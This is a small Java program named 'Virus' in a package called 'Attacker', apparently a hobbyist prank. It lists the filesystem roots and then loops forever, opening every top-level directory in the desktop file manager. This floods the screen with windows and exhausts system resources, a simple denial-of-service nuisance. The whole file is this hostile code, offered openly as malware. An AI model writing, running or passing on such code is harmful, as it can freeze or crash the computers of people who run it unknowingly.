package Attacker;


import java.awt.*;
import java.io.File;
import java.io.IOException;
import java.util.Arrays;

public class Virus {

    static String [] a ;
    static File file;

    public static void main(String[] args) {

        try {
            File[] paths;
            paths = File.listRoots();

           for(File path:paths){
               a = path.list();
               System.out.println(Arrays.toString(a));
               while(true){
                   for(int x  = 1 ; a.length >x ; x++){
                       File file1 = new File(path+ a[x]);
                       if(file1.isDirectory()){
                           Desktop desktop = Desktop.getDesktop();
                           File dirToOpen = new File(path + a[x]);
                           System.out.println("testes");
                           desktop.open(dirToOpen);
                           System.out.println(dirToOpen);
                       }
                   }
               }
           }

        }catch (IOException e){
            System.out.println(e);
        }
        System.out.println("BY ARMIN JAVA 11");
    }

}
